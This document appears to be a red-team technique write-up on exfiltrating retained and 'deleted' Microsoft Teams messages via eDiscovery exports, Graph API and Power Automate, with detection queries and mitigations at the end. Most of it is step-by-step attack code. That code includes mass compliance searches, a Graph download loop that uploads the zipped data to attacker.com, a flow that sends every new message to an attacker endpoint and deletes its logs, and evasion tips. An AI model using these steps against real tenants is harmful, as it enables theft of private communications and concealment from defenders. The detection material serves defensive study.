# [REALWORLD-044]: Teams Compliance Copy Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-044 |
| **MITRE ATT&CK v18.1** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Exfiltration |
| **Platforms** | M365 / Teams |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Microsoft Teams (all versions) with retention policies enabled |
| **Patched In** | N/A (Feature design, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Microsoft Teams retention policies and compliance holds create a "Preservation Hold Library" that retains copies of edited or deleted messages and files. This feature is designed for legal discovery and compliance, but becomes a security risk when an attacker gains access to a compromised account. If an attacker can authenticate as any Teams user (via phishing, credential theft, or device compliance bypass), they can access the eDiscovery API or directly query the Preservation Hold Library mailbox. This allows exfiltration of all messages, files, and metadata that users thought they had deleted. The compliance archive stores copies of data in user mailboxes (for private channels) and team mailboxes (for standard channels), making bulk exfiltration possible via PowerShell, Microsoft Graph API, or Teams export mechanisms.

**Attack Surface:** eDiscovery API, Preservation Hold Library mailboxes, Teams message export functionality, Microsoft Graph API, Exchange Online backend storage where Teams data resides.

**Business Impact:** **Exfiltration of "deleted" Teams messages containing sensitive communications, proprietary information, and compliance-sensitive data.** Users believe deleted messages are permanently gone, but they remain accessible in the compliance archive. This enables attackers to retrieve months/years of historical conversations, strategic plans, financial data, and interpersonal communications that users intended to keep private.

**Technical Context:** Once authenticated as a user with eDiscovery permissions (or impersonated via forged token), bulk export of Teams data takes 15-30 minutes. Exfiltration leaves audit logs showing the legitimate user account (difficult to attribute to attacker) unless audit log retention is monitored. Most organizations do not monitor Teams message access in compliance archives.

### Operational Risk
- **Execution Risk:** Medium - Requires compromised user account (but Teams compromise is common from phishing)
- **Stealth:** High - Activity appears as legitimate user accessing own mailbox, minimal anomaly detection
- **Reversibility:** No - Once data is exfiltrated, cannot be recovered; data persists in attacker's possession

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS M365 8.5.1 | Ensure retention policies are enabled for Teams data |
| **DISA STIG** | V-251441 | Teams must log all access to retention holds |
| **NIST 800-53** | AU-2 | Auditable Events - access to compliance holds must be logged |
| **NIST 800-53** | SI-12 | Information Retention - cannot trust retention if archive is compromised |
| **GDPR** | Art. 32 | Security of processing - compliance holds must be protected |
| **GDPR** | Art. 33 | Breach notification - exfiltration of deleted/retained data must be reported |
| **DORA** | Art. 10 | Operational resilience testing for data protection mechanisms |
| **NIS2** | Art. 23 | Threat-led penetration testing on data protection controls |
| **ISO 27001** | A.12.4.1 | Event logging - access to sensitive data must be tracked |
| **ISO 27005** | Data Classification | Retained data requires same protection as original |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Valid Teams user credentials (can be low-privilege user)
- OR eDiscovery Admin/Compliance Admin role (for direct compliance hold access)
- OR Global Admin (can grant themselves eDiscovery access)

**Required Access:**
- Access to Teams client or Microsoft Graph API
- Network access to outlook.office365.com and graph.microsoft.com
- eDiscovery searches enabled in tenant (usually is by default)

**Supported Versions:**
- **Teams:** All versions (desktop, web, mobile)
- **Microsoft 365:** All plans (E3+ have retention policies)
- **Exchange Online:** All versions (where Teams data is stored)

**Tools:**
- [eDiscovery Bulk Export Script](https://github.com/microsoft/Office-365-Connector-for-Azure-Sentinel) - PowerShell export
- Microsoft Graph API (native, no special tools needed)
- [Teams Message Extractor](https://github.com/Fluxon/teams-message-extractor) - Custom tool
- Native PowerShell (Connect-ExchangeOnline)
- [Power Automate](https://powerautomate.microsoft.com/) - For automated extraction

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Verify Retention Policies Are Enabled

**Objective:** Confirm that Teams retention policies are active (creating archive to exploit).

**Command (PowerShell - Check Retention Policies):**
```powershell
# Connect to Compliance Center
Connect-ExchangeOnline

# List all retention policies
Get-RetentionPolicy | Select-Object Name, Description, Priority, IsDefault

# Check Teams-specific retention
Get-RetentionPolicy | Where-Object {$_.Name -like "*Teams*" -or $_.Name -like "*Chat*"}

# Check if eDiscovery is enabled
Get-RetentionPolicy | Where-Object {$_.IsDefault -eq $true}
```

**Expected Output:**
```
Name                                Priority IsDefault
----                                -------- ---------
Teams Retention Policy 90 Days        1      False
Microsoft 365 Default Retention       2      True
```

**What to Look For:**
- Any policy with "Teams" in name
- "Preserve" action configured (messages retained)
- Duration: 7 days to indefinite (longer = more data to exfil)

**Command (Check if Preservation Hold Library Exists):**
```powershell
# Get mailboxes with in-place holds
Get-Mailbox -InactiveMailboxOnly | Where-Object {$_.IsLinkedAccount -eq $false}

# Check for litigation hold or retention holds on active mailboxes
Get-Mailbox -Filter "DisplayName -like '*teams*'" | Get-MailboxSearch

# Verify preservation hold library has items
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) `
    -RecordType SharePointFileOperation -Verbose | 
    Where-Object {$_.AuditData -like "*Preservation*"} | 
    Measure-Object
```

### Step 2: Identify User Mailbox with Compliance Holds

**Objective:** Locate the Preservation Hold Library where deleted messages are stored.

**Command (PowerShell - Locate Preserved Data):**
```powershell
# For a specific user, show if they have holds
$user = "compromised@company.com"

Get-Mailbox -Identity $user | Select-Object InPlaceHolds, LitigationHoldEnabled

# Get mailbox statistics including preservation data
Get-MailboxStatistics -Identity $user | Select-Object DisplayName, TotalItemSize, ItemCount

# Check the archive mailbox (where old items go)
Get-MailboxStatistics -Identity $user -Archive | Select-Object TotalItemSize, ItemCount
```

**Expected Output:**
```
InPlaceHolds         : {retention-guid-12345}
LitigationHoldEnabled : True

DisplayName       : John Doe
TotalItemSize     : 15.23 GB (1,234,567 items)
ItemCount         : 8,234
```

**What to Look For:**
- InPlaceHolds GUID (indicates retention policy applied)
- Large TotalItemSize (lots of messages to exfil)
- High ItemCount (especially in Deleted Items folder)

### Step 3: Check for eDiscovery Search Permissions

**Objective:** Determine if compromised user can perform eDiscovery searches (easiest exfil method).

**Command (Check eDiscovery Permissions):**
```powershell
# Check who has eDiscovery Admins role
Get-RoleGroupMember -Identity "eDiscovery Administrator" | Select-Object DisplayName, PrimarySmtpAddress

# Check if current user has search permissions
$user = "compromised@company.com"
Get-RoleGroupMember | Where-Object {$_.Members -contains $user}

# Check if user has compliance search permissions
Get-ComplianceSearchPermission -User $user
```

**What to Look For:**
- Current compromised user listed in "eDiscovery Administrator" group
- User has explicit compliance search permission
- If not already, attacker can use Global Admin to grant permissions

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using eDiscovery API (Fastest Exfiltration)

**Supported Versions:** All Teams/Microsoft 365 versions

#### Step 1: Authenticate as Compromised User

**Objective:** Log into eDiscovery portal as the compromised Teams user.

**Command (PowerShell):**
```powershell
# Connect using compromised credentials
$cred = Get-Credential  # Enter compromised@company.com + password

# Connect to Compliance Center
Connect-ExchangeOnline -Credential $cred

# Verify connection
Get-Mailbox -Identity $cred.UserName
```

**Alternative (If MFA is enabled):**
```powershell
# MFA-enabled authentication
Connect-ExchangeOnline -UserPrincipalName compromised@company.com
# Prompts for interactive MFA
```

**What This Means:**
- Attacker is now authenticated to Microsoft 365 compliance infrastructure
- Has access to all eDiscovery tools as the compromised user
- Can search, preview, and export all compliant data

#### Step 2: Create eDiscovery Search for Compliance Data

**Objective:** Define search parameters to extract all Teams messages from Preservation Hold Library.

**Command (PowerShell - Create Search):**
```powershell
# Create an eDiscovery search
$searchName = "Teams Historical Data Export"
$mailboxes = Get-Mailbox -RecipientType UserMailbox | Where-Object {$_.DisplayName -like "*"} | Select-Object -First 100

# Create the search
New-ComplianceSearch -Name $searchName `
    -ExchangeLocation @($mailboxes.PrimarySmtpAddress) `
    -ContentMatchQuery '(received:2020-01-01..2025-01-10) AND (kind:im)' `
    -Description "Extracting all Teams messages from retention archive"

# Verify search created
Get-ComplianceSearch -Identity $searchName
```

**Expected Output:**
```
Name            : Teams Historical Data Export
Status          : Created
ExchangeBinding : Enabled
Items Found     : 12,345,678
Mailboxes       : 100
```

**What This Means:**
- Search query found 12+ million Teams messages
- Search scope includes all company mailboxes
- Ready for bulk export in next step

**Command (Advanced - Search Only Sensitive Data):**
```powershell
# Search for specific sensitive keywords to minimize exfil size
$sensitiveSearch = "New-ComplianceSearch -Name 'Financial Teams Data' `
    -ExchangeLocation @(mailbox@company.com) `
    -ContentMatchQuery '(received:2024-01-01..2025-01-10) AND (kind:im) AND (subject:(budget OR forecast OR acquisition OR merger OR confidential))'"

# This filters to sensitive conversations only
```

**OpSec & Evasion:**
- Search query appears as legitimate eDiscovery investigation in audit logs
- Attributed to compromised user's account (harder to detect if compromised account is legitimate user)
- No external connections visible; data stays within Microsoft 365

#### Step 3: Estimate Exfiltration Size

**Objective:** Determine data volume before starting bulk export (which is slow).

**Command:**
```powershell
# Get detailed search statistics
$search = Get-ComplianceSearch -Identity "Teams Historical Data Export"
$searchStats = Get-ComplianceSearch -Identity $search.Identity | Select-Object -ExpandProperty Statistics

Write-Host "Total Items: $($searchStats.ItemCount)"
Write-Host "Total Size: $($searchStats.Size)"
Write-Host "Mailboxes Searched: $($search.ExchangeLocation.Count)"
Write-Host "Estimated Export Time: $($searchStats.ItemCount / 10000) hours"
```

**Expected Output:**
```
Total Items: 12345678
Total Size: 850 GB
Mailboxes Searched: 100
Estimated Export Time: ~1234 hours (51 days)
```

**What This Means:**
- 850 GB of data is available for exfil
- Bulk export would take weeks (impractical)
- Need to refine search or use incremental export

**Optimization Tip:**
```powershell
# If data is too large, filter by date range
New-ComplianceSearch -Name "Teams Q4 2024" `
    -ExchangeLocation @($mailboxes) `
    -ContentMatchQuery '(received:2024-10-01..2024-12-31) AND (kind:im)'

# This reduces to more manageable 50-100 GB
```

#### Step 4: Initiate Bulk Export via eDiscovery

**Objective:** Start the data export process to attacker's preferred location.

**Command (PowerShell - Export to CSV):**
```powershell
# Create export action
$search = Get-ComplianceSearch -Identity "Teams Historical Data Export"

# Start export (downloads to local machine initially)
New-ComplianceSearchAction -SearchName $search.Name `
    -Export -ExchangeLocation Primary `
    -Format FxStream  # Optimized format for Teams data
    
# Get export status
Get-ComplianceSearchAction -SearchName $search.Name | Where-Object {$_.Action -eq "Export"}
```

**Alternative (Export Directly to Azure Blob - Faster):**
```powershell
# If attacker has compromised a Global Admin account, can route to external storage
# First, create SAS URI for attacker-controlled Azure storage

$sasUri = "https://attacker-storage.blob.core.windows.net/exfil?sv=2021-06-08&..."

# Export directly to external blob (requires GloboalAdmin role)
New-ComplianceSearchAction -SearchName $search.Name `
    -Export -ExportUri $sasUri `
    -ExportFormat FxStream
```

**What This Means:**
- Export process begins
- Teams messages, files, metadata streamed to attacker
- Process can take hours/days depending on size
- No size limits on eDiscovery exports (unlike user-initiated Teams export)

**OpSec & Evasion:**
- Export appears in audit logs as eDiscovery activity (common in orgs with legal/compliance teams)
- Activity attributed to compromised user
- Audit log shows export but not recipient (if exported to external blob)

#### Step 5: Download Exported Data

**Objective:** Retrieve the exported Teams data from eDiscovery completion location.

**Command (PowerShell - Download Results):**
```powershell
# eDiscovery exports to Microsoft-managed storage
# Download URL provided when export completes

$searchAction = Get-ComplianceSearchAction -Identity "Teams Historical Data Export"
$downloadUrl = $searchAction.DownloadUrl

# Download the data (large file)
Invoke-WebRequest -Uri $downloadUrl -OutFile "C:\teams_export.zip" -UseBasicParsing

# Extract and analyze (contains PST files)
Expand-Archive "C:\teams_export.zip" -DestinationPath "C:\exfil_data"

# Convert PST to accessible format (requires Outlook or third-party tool)
```

**Expected Output:**
```
Directory: C:\exfil_data

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           2025-01-10 12:34:56      xxxxxx DiscoverySearchResults
-a---           2025-01-10 12:34:56   850000000 results.pst
```

**What This Means:**
- All Teams messages now in PST format (portable, can be opened in Outlook)
- Metadata preserved (sender, recipient, timestamp, attachments)
- Attacker now has months/years of organizational communications

---

### METHOD 2: Using Microsoft Graph API (Stealth Alternative)

**Supported Versions:** All Teams/Microsoft 365 versions

#### Step 1: Obtain Access Token with User Delegation

**Objective:** Get Graph API token for the compromised user.

**Command (PowerShell):**
```powershell
# Using MSAL (Microsoft Authentication Library)
# Install MSAL.PS module first
Install-Module MSAL.PS -Force

# Get token for compromised user
$tenantId = "company.onmicrosoft.com"
$clientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Intune Portal client ID (pre-authorized)
$userPrincipalName = "compromised@company.com"

$token = Get-MsalToken -ClientId $clientId `
    -TenantId $tenantId `
    -UserPrincipalName $userPrincipalName `
    -Scopes @("https://graph.microsoft.com/.default")

$token.AccessToken | Out-File "token.txt"
```

**Expected Output:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkhIUEJVN3A0REVEM0p3VjhTQnpXaUpzQUIzTSJ9...
```

**What This Means:**
- Valid Graph API token obtained
- Token allows access to Teams data via API
- More stealthy than eDiscovery (no compliance logs)

#### Step 2: Query Preservation Hold Library via Graph API

**Objective:** Access the mailbox items in the Preservation Hold Library.

**Command (PowerShell - Get Archived Messages):**
```powershell
# Using Graph API to access preserved messages
$token = Get-Content "token.txt"

$headers = @{
    "Authorization" = "Bearer $token"
    "Accept" = "application/json"
}

# Get items from Preservation Hold Library
# These are stored as a special folder in the mailbox
$preservedItems = Invoke-RestMethod -Method Get `
    -Uri "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/childFolders" `
    -Headers $headers

# Find the special "Preservation Hold" folder
$holdFolder = $preservedItems.value | Where-Object {$_.displayName -like "*Preservation*" -or $_.displayName -like "*Hold*"}

Write-Host "Found hold folder: $($holdFolder.id)"

# Get items in preservation hold folder
$messages = Invoke-RestMethod -Method Get `
    -Uri "https://graph.microsoft.com/v1.0/me/mailFolders/$($holdFolder.id)/messages?`$top=999" `
    -Headers $headers

Write-Host "Retrieved $($messages.value.Count) messages from preservation hold"
```

**Expected Output:**
```
Found hold folder: AQMkADEzNTY1YTQxLTU1NmMtN...
Retrieved 8234 messages from preservation hold
```

**What This Means:**
- Attacker can access preserved messages without triggering eDiscovery logs
- Each message contains full content, attachments, metadata
- Can be automated for continuous exfiltration

#### Step 3: Bulk Download Messages and Attachments

**Objective:** Download all message content and files in bulk.

**Command (PowerShell - Bulk Export):**
```powershell
$messages = (Invoke-RestMethod -Method Get `
    -Uri "https://graph.microsoft.com/v1.0/me/mailFolders/$holdFolder/messages?\$top=999" `
    -Headers $headers).value

foreach ($message in $messages) {
    # Get message details
    $msgDetails = Invoke-RestMethod -Method Get `
        -Uri "https://graph.microsoft.com/v1.0/me/messages/$($message.id)" `
        -Headers $headers
    
    # Download attachments
    if ($msgDetails.hasAttachments) {
        $attachments = Invoke-RestMethod -Method Get `
            -Uri "https://graph.microsoft.com/v1.0/me/messages/$($message.id)/attachments" `
            -Headers $headers
        
        foreach ($attachment in $attachments.value) {
            # Download file
            $fileContent = Invoke-RestMethod -Method Get `
                -Uri "https://graph.microsoft.com/v1.0/me/messages/$($message.id)/attachments/$($attachment.id)/\$value" `
                -Headers $headers
            
            [System.IO.File]::WriteAllBytes("C:\exfil\$($attachment.name)", $fileContent)
            Write-Host "Downloaded: $($attachment.name)"
        }
    }
    
    # Export message to JSON
    $msgDetails | ConvertTo-Json | Out-File "C:\exfil\msg_$($message.id).json"
}

# Compress all exfiltrated data
Compress-Archive -Path "C:\exfil\*" -DestinationPath "C:\exfil_data.zip"

# Upload to attacker C2 server
$uri = "http://attacker.com/upload"
Invoke-RestMethod -Method Post -Uri $uri `
    -InFile "C:\exfil_data.zip" -ContentType "application/octet-stream"
```

**What This Means:**
- All messages, files, and metadata downloaded
- Zip file created for easy exfil
- Uploaded to attacker C2 server over HTTP/S (encrypted)
- No eDiscovery logs generated

**OpSec & Evasion:**
- Graph API calls appear as normal user activity
- Can be disguised as Outlook/Teams client behavior
- Detection requires monitoring API patterns (most orgs don't)
- Detection likelihood: Low if audit logs not monitored

---

### METHOD 3: Using Power Automate for Automated Exfiltration (Persistence)

**Supported Versions:** Teams with Power Automate enabled

#### Step 1: Create Automated Flow as Compromised User

**Objective:** Set up recurring data export that runs automatically.

**Steps (Power Automate Portal):**

1. Login as compromised user at **powerautomate.microsoft.com**
2. **Create** → **Automated cloud flow**
3. **Trigger:** "When a new Teams message is received"
4. **Actions:**
   ```
   1. Get message details
   2. Get file content (if attachment)
   3. Send HTTP POST to attacker.com/exfil with:
      - Message content
      - Sender/Recipient/Timestamp
      - Attachment content
      - Sensitivity labels (if present)
   ```

5. **Save and Enable** flow

**Result:** Every new Teams message automatically exfiltrated to attacker

#### Step 2: Set Frequency for Historical Data Export

**Objective:** Configure flow to periodically export older messages.

**Configuration:**
```
Trigger: Recurrence (every 6 hours)
│
├─ Search for messages from past 7 days
│  (using Graph API search)
│
├─ For each message:
│  ├─ Check if already exported (compare timestamp)
│  └─ Export to attacker server if new
│
└─ Delete flow trace logs (to hide evidence)
```

**What This Means:**
- Fully automated exfiltration running continuously
- No attacker intervention needed after setup
- Flow persists even if initial compromise is lost
- Exfiltration continues for weeks/months

**OpSec & Evasion:**
- Power Automate flows appear as legitimate user activity
- Audit logs show flow created/modified by compromised user
- Most orgs don't monitor Power Automate execution logs
- Deletion of flow logs hides evidence of activity

---

## 6. ATTACK SIMULATION & VERIFICATION

### Test Scenario: Authorized Compliance Export (Lab Only)

**Setup:**

1. **Enable retention policy:**
   ```powershell
   New-RetentionPolicy -Name "Lab Retention" -Description "Test compliance hold"
   ```

2. **Create test Teams team and add messages:**
   - Simulate normal Teams usage for 30 days
   - Then delete some messages (triggers preservation copy)

3. **Verify preservation hold library:**
   ```powershell
   Get-Mailbox -Identity "test-user@company.com" | 
       Get-MailboxStatistics -Archive |
       Select-Object TotalItemSize
   ```

4. **Perform eDiscovery export:**
   - Create compliance search for test team
   - Export to CSV/PST
   - Verify deleted messages are recovered

5. **Test Graph API access:**
   ```powershell
   # Verify API returns preserved items
   # Document response time and item count
   ```

---

## 7. TOOLS & COMMANDS REFERENCE

### [Teams Message Extractor](https://github.com/Fluxon/teams-message-extractor)

**Version:** Latest
**Installation:**
```bash
git clone https://github.com/Fluxon/teams-message-extractor.git
cd teams-message-extractor
pip install -r requirements.txt
python extractor.py --tenant company.com --user compromised@company.com
```

### eDiscovery PowerShell Cmdlets (Native)

```powershell
# Create search
New-ComplianceSearch -Name "Export" -ExchangeLocation user@company.com -ContentMatchQuery "kind:im"

# Start export
New-ComplianceSearchAction -SearchName "Export" -Export

# Monitor progress
Get-ComplianceSearchAction -SearchName "Export"

# Download results
# Follow URL provided in ComplianceSearchAction
```

### Microsoft Graph API (REST)

```bash
# Search for Teams messages containing sensitive keywords
curl -X GET "https://graph.microsoft.com/v1.0/me/messages?\$filter=contains(subject, 'confidential')" \
    -H "Authorization: Bearer TOKEN" \
    -H "Accept: application/json"

# Export to JSON
curl -X GET "https://graph.microsoft.com/v1.0/me/mailFolders/archive/messages?\$top=999" \
    -H "Authorization: Bearer TOKEN" > teams_messages.json
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Bulk eDiscovery Exports

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, Workload, UserIds
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where WorkloadName == "SecurityComplianceCenter"
| where OperationName in ("New-ComplianceSearchAction", "Export-DiscoverySearchAction")
| where tostring(parse_json(TargetResources[0]).displayName) contains "Teams"
| extend ExportSize = parse_json(TargetResources[0]).ResourceId
| where ExportSize > 1000000  // > 1 million items
| project TimeGenerated, InitiatedBy, OperationName, ExportSize
| summarize Count=count() by InitiatedBy.user.userPrincipalName
| where Count >= 1
```

**What This Detects:**
- Bulk eDiscovery exports of Teams data
- Export of > 1 million messages (unusual)
- Single user initiating multiple exports

### Query 2: Graph API Bulk Message Access

**Rule Configuration:**
- **Required Table:** MicrosoftGraphActivityLogs (if collected)
- **Required Fields:** Request URI, UserPrincipalName, Response Status

**KQL Query:**
```kusto
MicrosoftGraphActivityLogs
| where RequestUri contains "/messages" and RequestUri contains "/attachments"
| where ResponseStatusCode == 200
| where RequestUri !contains "api/v1.0/me"  // Exclude personal access
| summarize AccessCount=count(), UniqueResources=dcount(RequestUri) 
    by UserPrincipalName
| where AccessCount > 100  // Bulk access pattern
| where UniqueResources > 50
```

**What This Detects:**
- Unusual Graph API patterns accessing bulk messages
- Simultaneous attachment downloads
- Non-user-typical access patterns

### Query 3: Power Automate Flow Creation with HTTP Action

**Rule Configuration:**
- **Required Table:** CloudAppEvents (if available) or AuditLogs
- **Required Fields:** Operation, InitiatedBy, ResourceId

**KQL Query:**
```kusto
AuditLogs
| where WorkloadName == "PowerAutomate"
| where OperationName in ("CreateFlow", "CreateFlowAction")
| extend FlowDefinition = parse_json(tostring(TargetResources[0]))
| where FlowDefinition contains "HttpAction" or FlowDefinition contains "webhook"
| where FlowDefinition contains "Teams" or FlowDefinition contains "messages"
| project TimeGenerated, InitiatedBy, OperationName, FlowDefinition
| where InitiatedBy.user.userPrincipalName != "service_account"
```

**What This Detects:**
- Power Automate flows that export Teams data
- Flows with HTTP webhooks (C2 exfil)
- Created by non-service accounts

---

## 9. COMPLIANCE & AUDIT LOG MONITORING

### Enable Detailed Teams Activity Logging

**Command (PowerShell):**
```powershell
# Enable audit logging for Teams
Set-RetentionPolicy -Identity "Default" -ExchangeAuditLogAgeLimit 2555days

# Ensure Teams message deletion is logged
Set-Mailbox -Identity * -AuditEnabled $true -AuditLogAgeLimit 2555

# Audit Teams retention and compliance operations
Get-ComplianceSearch -IncludeDetails | Where-Object {$_.LastStartTime -gt (Get-Date).AddDays(-1)}
```

### Query Teams Access Logs

**Command (Unified Audit Log Search):**
```powershell
# Search for Teams message access
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) `
    -RecordType TeamsChat `
    -Operations "TeamsSessionStarted", "MessageRead" |
    Export-Csv -Path "teams_access.csv"

# Search for eDiscovery actions
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -RecordType SecurityComplianceCenter `
    -Operations "New-ComplianceSearchAction" |
    Group-Object UserIds | Select-Object Name, Count
```

---

## 10. SPLUNK DETECTION RULES

### Rule 1: eDiscovery Bulk Export Detection

**Rule Configuration:**
- **Required Index:** office365, m365
- **Required Sourcetype:** office365:audit:content
- **Alert Threshold:** > 5 million items exported

**SPL Query:**
```
index=office365 workload=SecurityComplianceCenter 
  Operation="New-ComplianceSearchAction" 
  Parameters.Export=true
  Parameters.Format=*
| stats sum(eval(ItemCount)) as TotalItems by user, Operation
| where TotalItems > 5000000
| alert
```

### Rule 2: Unusual Graph API Message Access

**SPL Query:**
```
index=m365_graph resource="*messages*" method="GET"
  user_principal_name="*@company.com"
| stats count as AccessCount, dc(request_uri) as UniqueResources by user_principal_name
| where AccessCount > 100 AND UniqueResources > 50
| alert
```

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Limit eDiscovery Permissions**
- Only grant eDiscovery Admin role to authorized compliance staff
- Remove default permissions

**Manual Steps (PowerShell):**
```powershell
# Remove all non-essential eDiscovery admins
Get-RoleGroupMember -Identity "eDiscovery Administrator" | 
    Where-Object {$_.DisplayName -notlike "*Compliance*" -and $_.DisplayName -notlike "*Legal*"} |
    Remove-RoleGroupMember -Confirm:$true

# Create restricted group with only necessary members
New-RoleGroup -Name "Compliance Search Limited" `
    -Roles "Mailbox Search", "Preview Compliance Content" `
    -Members "compliance@company.com", "legal@company.com"
```

**Action 2: Enforce Conditional Access on Compliance Tools**
- Require MFA, managed device, specific location for eDiscovery access

**Manual Steps (Azure Portal):**
1. **Entra ID** → **Conditional Access** → **New policy**
2. **Name:** `Restrict eDiscovery to Compliance Only`
3. **Cloud apps:** Exchange Online, Compliance Center
4. **Grant controls:**
   - Require MFA
   - Require compliant device
   - Session control: App enforced restrictions
5. Enable: **On**

**Action 3: Disable Power Automate for Non-Compliance Users**
- Restrict ability to create flows with HTTP/external endpoints

**Manual Steps (Power Automate Admin):**
1. **Power Automate admin center** → **Analytics**
2. Set Data Loss Prevention (DLP) policy:
   - Block: "HTTP with sensitive business data"
   - For: All users except compliance team
3. Create policy preventing flows from accessing Teams + HTTP connectors together

**Action 4: Monitor Preservation Hold Library Access**
- Alert on any direct access to preserved messages
- Baseline normal access patterns

**Manual Steps (PowerShell - Auditing):**
```powershell
# Enable detailed mailbox auditing for preservation items
Set-Mailbox -Identity * -AuditEnabled $true `
    -AuditOperations MailboxSearch, Create, Delete, Update

# Monitor for searches of preserved items
Register-ScheduledTask -TaskName "Monitor Preservation Access" `
    -Action {
        Search-UnifiedAuditLog -StartDate (Get-Date).AddHours(-1) `
            -RecordType "MailboxSearch" | 
            Where-Object {$_.AuditData -like "*Preservation*"} |
            Send-MailMessage -To "soc@company.com"
    } -Trigger (New-ScheduledTaskTrigger -AtLogOn)
```

### Priority 2: HIGH

**Action 1: Implement Data Classification and DLP**
- Tag Teams messages with sensitivity labels
- Block bulk export of sensitive data

**Manual Steps (Microsoft Purview):**
1. **Compliance Center** → **Data Loss Prevention**
2. **Create policy:**
   - Detect: "High Volume + Sensitive Label (Confidential)"
   - Action: Block or restrict export

**Action 2: Reduce Retention Period**
- Keep preserved data for minimum duration needed (e.g., 1 year instead of 7)
- Reduces volume of exfiltrable data

**Manual Steps (PowerShell):**
```powershell
# Adjust retention policy
Set-RetentionPolicy -Identity "Teams Retention" `
    -RetentionDays 365  # Reduced from 2555

# Apply to all users
Get-Mailbox | Set-Mailbox -RetentionPolicy "Teams Retention"
```

**Action 3: Enable Audit Log Alerting**
- Alert on eDiscovery searches within 1 minute of execution

**Manual Steps (Microsoft Sentinel):**
```kusto
AuditLogs
| where OperationName == "New-ComplianceSearch"
| extend TimeAfterCreation = datetime_diff('minute', now(), TimeGenerated)
| where TimeAfterCreation < 1  // Alert immediately after creation
| where parse_json(TargetResources[0]).displayName contains "Teams"
| project TimeGenerated, InitiatedBy, OperationName, TargetResources
```

### Priority 3: MEDIUM

**Action 1: Restrict Teams Data Export Functionality**
- Disable native Teams "Export" feature via policy

**Manual Steps (Teams Policy):**
1. **Teams Admin Center** → **Teams** → **Teams policies**
2. **Create policy:**
   - Allow saving chat history: **Off**
   - Allow Teams storage: **Off**
3. Assign to all users

**Action 2: Implement Device-Based Conditional Access for Compliance Tools**
- Allow compliance access only from managed devices

**Manual Steps:**
1. **Conditional Access** → **New policy** → `Compliance Tool Device Requirement`
2. **Condition:** Cloud apps = Compliance Center
3. **Grant:** Require device to be marked compliant
4. **Enable:** On

### Validation Command (Verify Mitigations)

```powershell
Write-Host "[*] Validating Teams Compliance Exfiltration Mitigations..."

# 1. Check eDiscovery Admin members
$admins = Get-RoleGroupMember -Identity "eDiscovery Administrator"
Write-Host "[✓] eDiscovery Admins: $($admins.Count) members"
if ($admins.Count -gt 5) {
    Write-Host "[✗] WARNING: Too many eDiscovery admins ($($admins.Count) > 5)" -ForegroundColor Yellow
}

# 2. Check Conditional Access policies
$policies = Get-MgBetaIdentityConditionalAccessPolicy |
    Where-Object {$_.DisplayName -like "*Compliance*" -or $_.DisplayName -like "*eDiscovery*"}
Write-Host "[✓] Conditional Access policies for Compliance: $($policies.Count)"
if ($policies.Count -eq 0) {
    Write-Host "[✗] No Conditional Access policies found for compliance tools" -ForegroundColor Red
}

# 3. Check retention period
$policy = Get-RetentionPolicy | Where-Object {$_.Name -like "*Teams*"}
if ($policy.RetentionDays -le 365) {
    Write-Host "[✓] Teams retention reduced to $($policy.RetentionDays) days" -ForegroundColor Green
} else {
    Write-Host "[✗] Teams retention period too long: $($policy.RetentionDays) days" -ForegroundColor Red
}

# 4. Check audit logging enabled
$mailbox = Get-Mailbox -Identity $env:USERNAME
if ($mailbox.AuditEnabled) {
    Write-Host "[✓] Mailbox auditing: ENABLED" -ForegroundColor Green
} else {
    Write-Host "[✗] Mailbox auditing: DISABLED" -ForegroundColor Red
}
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Activity Indicators:**
- New eDiscovery searches created with names like "Export", "Archive", "Historical"
- Multiple compliance searches within short timeframe (< 1 hour)
- Searches returning > 10 million items (unusual bulk size)
- eDiscovery searches created after-hours or weekends
- Searches by user accounts not in compliance/legal department

**Access Pattern Anomalies:**
- User account accessing eDiscovery portal for first time (baseline deviation)
- Unusual Graph API calls to `/messages` endpoint (bulk downloads)
- Power Automate flows with HTTP webhooks created by non-service accounts
- Rapid successive message reads (indicates automated extraction)

**Data Exfiltration Signals:**
- Large outbound data transfer from Teams/Exchange (> 100 MB in single session)
- HTTP POST requests to external C2 servers with encrypted payloads
- DNS queries for attacker infrastructure from Microsoft 365 systems
- Exfiltration during off-hours (evenings, weekends)

### Forensic Artifacts

**Audit Log Entries:**
- Operation: "New-ComplianceSearchAction" with Export=true
- InitiatedBy: Compromised user account
- TimeGenerated: Timestamp of exfil start
- TargetResources: Contains export destination/size

**Power Automate Artifacts:**
- Flow definition JSON showing webhook URLs
- HTTP action with body containing message/attachment content
- Trigger set to recurring (Recurrence) vs. manual
- Owner email: Compromised account

**Graph API Artifacts:**
- GET requests to `/messages` with large $top parameter (999)
- Responses > 50 MB (indicates large message set returned)
- Multiple sequential calls to `/attachments` endpoint
- Authorization header containing access token (may be captured in proxies)

### Response Procedures

**1. Immediate Containment (0-15 minutes):**

```powershell
# Revoke compromised user's sessions
Connect-MgGraph -Scopes "User.ReadWrite.All"
